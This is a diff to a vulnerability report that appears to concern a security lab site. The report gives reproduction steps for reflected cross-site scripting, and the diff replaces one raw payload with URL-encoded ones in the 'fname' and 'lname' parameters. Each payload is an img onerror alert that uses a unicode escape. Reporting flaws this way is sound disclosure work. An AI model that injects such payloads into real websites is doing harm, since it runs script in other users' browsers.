@@ -9,7 +9,7 @@ https://kzlabs.com/punishment/18.php
 
 
 ## Steps to Reproduce
-1. Open the following URL in a browser: https://kzlabs.com/punishment/18.php?lname="><ImG src=x onerror=\u0061lert("XSS")>
+1. Open the following URL in a browser: https://kzlabs.com/punishment/1.php?fname=%22%3E%3CImG+src%3Dx+onerror%3D%5Cu0061lert%28%22XSS%22%29%3E&lname=%22%3E%3CImG+src%3Dx+onerror%3D%5Cu0061lert%28%22XSS1%22%29%3E
 2. You will see a javascript alert box is getting triggered.
 3. This confirms that arbitrary javascript is executed in the browser.
 
